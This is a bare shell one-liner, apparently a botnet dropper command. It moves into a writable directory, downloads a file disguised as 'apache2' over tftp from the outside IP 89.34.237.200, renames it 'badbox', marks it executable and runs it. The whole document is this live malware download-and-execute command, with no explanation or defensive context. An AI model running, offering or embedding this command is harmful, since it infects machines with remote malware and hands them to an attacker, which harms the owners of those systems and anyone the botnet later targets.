cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.34.237.200 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
